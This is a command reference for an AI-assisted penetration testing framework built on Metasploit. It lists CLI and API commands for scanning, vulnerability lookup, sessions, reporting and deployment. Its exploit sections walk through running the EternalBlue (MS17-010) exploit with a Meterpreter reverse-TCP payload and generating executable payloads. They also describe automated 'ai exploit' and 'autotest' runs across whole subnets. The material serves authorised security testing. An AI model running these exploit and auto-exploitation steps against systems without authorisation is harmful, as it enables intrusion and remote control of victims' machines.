# Metasploit-AI Framework Commands Reference

## 🚀 Main Application Commands

### Starting the Framework
```bash
# Start with CLI interface (default)
python app.py

# Start with specific mode
python app.py --mode cli
python app.py --mode web
python app.py --mode gui

# Start with custom configuration
python app.py --config config/production.yaml

# Start with debug mode
python app.py --debug

# Start web server on custom host/port
python app.py --mode web --host 0.0.0.0 --port 8080

# Show help
python app.py --help
```

### Configuration Management
```bash
# Use default configuration
python app.py --config config/default.yaml

# Use development configuration
python app.py --config config/development.yaml

# Use production configuration
python app.py --config config/production.yaml

# Override with environment variables
export SECRET_KEY="your-secret-key"
export ADMIN_PASSWORD="secure-password"
python app.py --config config/production.yaml
```

## 🖥️ CLI Interface Commands

### Basic Commands
```bash
# Show help
help

# Show available commands
help <command>

# Show framework status
status

# Exit the framework
exit
quit
```

### Target Management
```bash
# Set target
set target 192.168.1.100
set target example.com
set target 192.168.1.0/24

# Show current target
show target

# Clear target
unset target
```

### Scanning Commands
```bash
# Quick scan
scan
scan quick

# Comprehensive scan
scan comprehensive

# Stealth scan
scan stealth

# Aggressive scan
scan aggressive

# Custom scan with options
scan --ports 1-1000 --timing 4

# Scan specific target
scan 192.168.1.100

# Show scan results
show scans
show scan <scan_id>

# Export scan results
export scan <scan_id> json
export scan <scan_id> xml
```

### Vulnerability Analysis
```bash
# Analyze vulnerabilities
vulns

# Show vulnerability details
show vuln <vuln_id>

# Search vulnerabilities
search vuln <keyword>

# Filter vulnerabilities by severity
vulns --severity critical
vulns --severity high
vulns --severity medium
vulns --severity low
```

### Exploit Management
```bash
# Search exploits
search exploit <keyword>
search exploit ms17-010

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show exploit info
info exploit/windows/smb/ms17_010_eternalblue

# Set exploit options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.10
set LPORT 4444

# Show exploit options
show options

# Run exploit
exploit
run

# Show active exploits
show exploits

# Show sessions
sessions
sessions -l

# Interact with session
sessions -i 1
```

### Payload Management
```bash
# Search payloads
search payload windows/meterpreter

# Set payload
set payload windows/meterpreter/reverse_tcp

# Show payload options
show payload options

# Generate custom payload
generate payload --target windows --format exe
generate payload --target linux --format elf
```

### AI-Powered Features
```bash
# Get AI recommendations
recommend

# AI-powered vulnerability analysis
ai analyze

# Generate AI payload
ai payload --target 192.168.1.100 --exploit ms17-010

# Auto-exploit with AI
ai exploit --confidence 0.8

# Automated penetration test
autotest --targets file:targets.txt
autotest --targets 192.168.1.0/24
```

### Reporting Commands
```bash
# Generate report
report

# Generate specific format report
report --format html
report --format json
report --format pdf

# Generate executive summary
summary

# Export results
export --format json --output results.json
export --format xml --output results.xml
```

### Database Commands
```bash
# Show database status
db_status

# Connect to database
db_connect

# Rebuild database
db_rebuild

# Show workspaces
workspace

# Create workspace
workspace -a pentest_2024

# Delete workspace
workspace -d pentest_old
```

### Session Management
```bash
# List sessions
sessions

# Background session
background

# Interact with session
sessions -i 1

# Kill session
sessions -k 1

# Upgrade session
sessions -u 1
```

## 🌐 Web Interface API Commands

### Authentication
```bash
# Login (POST /login)
curl -X POST http://localhost:8080/login \
  -d "username=admin&password=admin"

# API with key
curl -H "X-API-Key: your-api-key" \
  http://localhost:8080/api/status
```

### Scanning API
```bash
# Start scan
curl -X POST http://localhost:8080/api/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: your-api-key" \
  -d '{"target": "192.168.1.100", "scan_type": "comprehensive"}'

# Get scan status
curl -H "X-API-Key: your-api-key" \
  http://localhost:8080/api/scan/status/<scan_id>

# Get scan results
curl -H "X-API-Key: your-api-key" \
  http://localhost:8080/api/scan/results/<scan_id>
```

### Exploitation API
```bash
# Get exploit recommendations
curl -X POST http://localhost:8080/api/exploits/recommend \
  -H "Content-Type: application/json" \
  -H "X-API-Key: your-api-key" \
  -d '{"target": "192.168.1.100", "vulnerabilities": [...]}'

# Execute exploit
curl -X POST http://localhost:8080/api/exploit/execute \
  -H "Content-Type: application/json" \
  -H "X-API-Key: your-api-key" \
  -d '{"target": "192.168.1.100", "exploit_name": "ms17-010", "options": {}}'

# Generate payload
curl -X POST http://localhost:8080/api/payload/generate \
  -H "Content-Type: application/json" \
  -H "X-API-Key: your-api-key" \
  -d '{"target": "192.168.1.100", "exploit_name": "ms17-010"}'
```

### Automated Testing API
```bash
# Start automated penetration test
curl -X POST http://localhost:8080/api/autotest \
  -H "Content-Type: application/json" \
  -H "X-API-Key: your-api-key" \
  -d '{"targets": ["192.168.1.100", "192.168.1.101"]}'
```

### Metasploit Integration API
```bash
# Get available exploits
curl -H "X-API-Key: your-api-key" \
  http://localhost:8080/api/msf/exploits

# Get available payloads
curl -H "X-API-Key: your-api-key" \
  http://localhost:8080/api/msf/payloads

# Get sessions
curl -H "X-API-Key: your-api-key" \
  http://localhost:8080/api/msf/sessions
```

## 🔧 Development Commands

### Setup and Installation
```bash
# Install dependencies
pip install -r requirements.txt

# Install development dependencies
pip install -r requirements-dev.txt

# Full installation
./scripts/install.sh

# Setup framework for development
python setup.py develop
```

### Testing Commands
```bash
# Run all tests
pytest tests/ -v

# Run with coverage
pytest tests/ --cov=src --cov-report=html

# Run specific test file
pytest tests/test_framework.py -v

# Run specific test
pytest tests/test_framework.py::test_scan_target -v
```

### Code Quality Commands
```bash
# Format code
black src/ tests/

# Check formatting
black src/ tests/ --check

# Lint code
flake8 src/ tests/

# Type checking
mypy src/

# Security scan
bandit -r src/
```

### System Commands
```bash
# System check
python scripts/system_check.py

# Framework help
python app.py --help

# Test framework
python app.py --mode cli
```

## 🐳 Docker Commands (If Available)

```bash
# Build Docker image
docker build -t metasploit-ai .

# Run container
docker run -it -p 8080:8080 metasploit-ai

# Run with custom config
docker run -it -p 8080:8080 \
  -v $(pwd)/config:/app/config \
  metasploit-ai --config config/production.yaml

# Run in background
docker run -d -p 8080:8080 \
  --name metasploit-ai-server \
  metasploit-ai --mode web
```

## 📊 Task Commands (VS Code Tasks)

```bash
# Available VS Code tasks (run with Ctrl+Shift+P -> "Tasks: Run Task")
- Install Dependencies
- Install Dev Dependencies
- Full Installation
- System Check
- Test Framework Help
- Start Web Interface
- Start CLI Interface
- Setup Framework
- Run Tests
- Run Tests with Coverage
- Code Formatting (Black)
- Format Code
- Lint Code (Flake8)
- Security Check (Bandit)
- Type Check (MyPy)
```

## 🚨 Production Deployment Commands

### Environment Setup
```bash
# Set production environment variables
export SECRET_KEY=$(python -c "import secrets; print(secrets.token_hex(32))")
export ADMIN_USERNAME="secure_admin"
export ADMIN_PASSWORD="your_secure_password"
export DB_PASSWORD="secure_db_password"
export MSF_PASSWORD="secure_msf_password"
export VALID_API_KEYS="api_key_1,api_key_2,api_key_3"
```

### Production Deployment
```bash
# Start with production config
python app.py --config config/production.yaml --mode web

# Use with WSGI server
gunicorn --config gunicorn.conf.py app:app

# Start with systemd (production)
sudo systemctl start metasploit-ai
sudo systemctl enable metasploit-ai
```

### Monitoring Commands
```bash
# Check health
curl http://localhost:8080/health

# Get metrics
curl http://localhost:8080/metrics

# Check logs
tail -f /var/log/metasploit-ai/app.log
tail -f /var/log/metasploit-ai/error.log
```

## 📝 Configuration Commands

### Environment Variables
```bash
# Core settings
export MSF_HOST=127.0.0.1
export MSF_PORT=55553
export MSF_USER=msf
export MSF_PASSWORD=your_password

# Database settings
export DB_TYPE=postgresql
export DB_HOST=localhost
export DB_NAME=metasploit_ai
export DB_USER=msf_user
export DB_PASSWORD=db_password

# Web settings
export WEB_HOST=0.0.0.0
export WEB_PORT=8080
export SECRET_KEY=your_secret_key

# Security settings
export API_KEYS=key1,key2,key3
export RATE_LIMIT=100
export DEBUG=false
```

## 🔍 Troubleshooting Commands

### Diagnostic Commands
```bash
# Check framework status
python app.py --mode cli
> status

# Test database connection
python -c "from src.core.database import DatabaseManager; db = DatabaseManager(); print('DB OK')"

# Test Metasploit connection
python -c "from src.core.metasploit_client import MetasploitClient; print('MSF OK')"

# Check dependencies
pip check

# Verify installation
python scripts/system_check.py
```

### Debug Commands
```bash
# Start in debug mode
python app.py --debug

# Enable verbose logging
python app.py --mode cli
> set debug true

# Check configuration
python -c "from src.core.config import Config; c = Config.load_config(); print(c.get_summary())"
```

## 📚 Help and Documentation

```bash
# Get general help
python app.py --help

# CLI help
python app.py --mode cli
> help

# Command-specific help
python app.py --mode cli
> help scan
> help exploit
> help set

# Show version
python app.py --version

# Framework information
python app.py --mode cli
> info
```

---

## 📖 Quick Start Examples

### Example 1: Basic Scan and Exploit
```bash
python app.py --mode cli
> set target 192.168.1.100
> scan comprehensive
> vulns
> recommend
> use exploit/windows/smb/ms17_010_eternalblue
> set RHOSTS 192.168.1.100
> exploit
```

### Example 2: Web API Usage
```bash
# Start web server
python app.py --mode web --port 8080

# Scan via API
curl -X POST http://localhost:8080/api/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: your-api-key" \
  -d '{"target": "192.168.1.100"}'
```

### Example 3: Automated Testing
```bash
python app.py --mode cli
> autotest --targets 192.168.1.0/24 --confidence 0.8
> report --format html
```

For more detailed information, see the user manual in `docs/user-manual.md`.
